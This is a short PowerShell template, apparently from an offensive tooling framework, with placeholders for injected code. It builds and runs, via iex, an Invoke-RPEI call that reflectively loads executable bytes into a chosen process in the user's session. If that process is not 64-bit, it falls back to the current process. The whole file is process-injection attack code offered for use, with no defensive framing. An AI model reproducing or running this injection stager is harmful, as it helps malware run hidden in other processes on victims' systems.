%libtransform%

$cmd = 'Invoke-RPEI -PEBytes $buf'
if ([string]::IsNullOrEmpty("%inject_name%")){
    $procid = $pid;
}else {
    $procid = (Get-Process -Name "%inject_name%" | ? {$_.SI -eq (Get-Process -PID $PID).SessionId} |select-object -first 1).Id;
}
$exeArgs = $null

%code%
Write-Host "Is64BitProcess:", $([Environment]::Is64BitProcess);
if (![Environment]::Is64BitProcess) {
    $procid=$pid;
    write-host "INJECT: fall back to current process";
}
if ($procid -ne $pid) {
    $cmd += ' -ProcID $procid'
}
%import_reflect%
iex $cmd
